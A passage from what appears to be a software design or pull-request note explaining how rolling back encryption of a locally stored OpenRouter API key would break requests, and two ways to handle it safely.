as `v1:<iv>:<ciphertext>`. The pre-encryption reader returns `localStorage` as it is, so a build
without §9 would send the ciphertext as the API key, and every request would fail with a 401 until
the author connected again (the §2 mark would then show "key rejected · Reconnect"; nothing is
spent). A rollback must therefore do one of two things: **keep a `v1:` reader** (revert the
features but keep `openrouter-key.js`'s load/unseal path), or **clear the sealed value** on first
load (`localStorage.removeItem('lattice-db-or-key')` when it starts with `v1:`) so the author is
asked to connect again instead of failing on every request. Graded as this PR's weakest axis by
the card's checker, 2026-11-06.
